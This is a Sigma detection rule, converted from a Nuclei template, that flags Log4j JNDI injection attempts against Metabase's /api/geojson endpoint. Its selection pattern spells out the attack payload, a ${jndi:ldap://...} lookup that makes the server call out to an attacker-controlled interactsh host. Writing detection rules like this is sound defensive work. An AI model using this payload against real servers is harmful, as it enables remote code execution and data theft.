title: Metabase - Remote Code Execution (Apache Log4j)
id: 6ddb080f-3f92-437d-ac3e-b9d23ad39aaa
status: experimental
logsource:
  product: webserver
description: Metabase is susceptible to remote code execution due to an incomplete
  patch in Apache Log4j 2.15.0 in certain non-default configurations. A remote attacker
  can pass malicious data and perform a denial of service attack, exfiltrate data,
  or execute arbitrary code.
reference: 'Generated by converting Nuclei Template. Template ID: metabase-log4j Refer
  the templates here: https://github.com/projectdiscovery/nuclei-templates'
author: 'Exploit/Attack Authors: DhiyaneshDK; Converted to Sigma by: @pbssubhash'
date: 2024/06/23
detection:
  selection-method-1:
    cs-method: GET
  selection-paths-1:
    cs-uri-stem:
      - /api/geojson
  selection-query-1:
    cs-uri-query:
      - url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}
  filter-status-code-1:
    sc-status: 404
  condition: selection-method-1 and selection-paths-1 and selection-query-1 and not
    filter-status-code-1
level: low
falsepositives: Nuclei scanning, Legitimate penetration testing
